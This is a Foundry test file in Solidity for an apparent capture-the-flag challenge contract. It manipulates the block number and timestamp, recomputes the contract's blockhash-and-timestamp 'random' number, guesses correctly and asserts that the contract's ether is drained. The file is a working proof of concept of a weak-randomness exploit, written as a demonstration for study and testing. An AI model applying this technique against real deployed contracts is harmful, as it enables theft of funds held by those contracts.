
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {
    GuessTheRandomNumberChallenge challenge;

    function setUp() public {
        // Deploy the challenge with the required 1 ether stake
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp) public {
        // --- 1. Constraints ---

        // Avoid unrealistic timestamps: keep within 1e10 (~Sat Nov 20 2286)
        vm.assume(blockTimestamp > 0 && blockTimestamp < 1e10);

        // --- 2. State Configuration ---

        // Ensure this test contract has enough ether to play and receive payout
        vm.deal(address(this), 10 ether);

        // Find a future block number so that blockhash(block.number - 1) is defined
        // In Forge tests, current block.number starts at some value; we roll ahead by 10 blocks
        uint256 targetBlockNumber = block.number + 10;

        // Manipulate the block environment before deployment of a *new* challenge instance.
        // This ensures its constructor uses the known blockhash and timestamp.
        vm.roll(targetBlockNumber);
        vm.warp(blockTimestamp);

        // Re-deploy under controlled environment; this instance will use our controlled randomness
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();

        // --- 3. Replication & Assertion ---

        // Reproduce the contract's randomness logic locally
        bytes32 bh = blockhash(block.number - 1);
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(bh, block.timestamp))));

        // Execute the guess with the predicted random value
        challenge.guess{value: 1 ether}(predictedAnswer);

        // Assert that we drained the contract (won the game)
        assertTrue(challenge.isComplete(), "Randomness was not predictable / guess failed");
    }
}
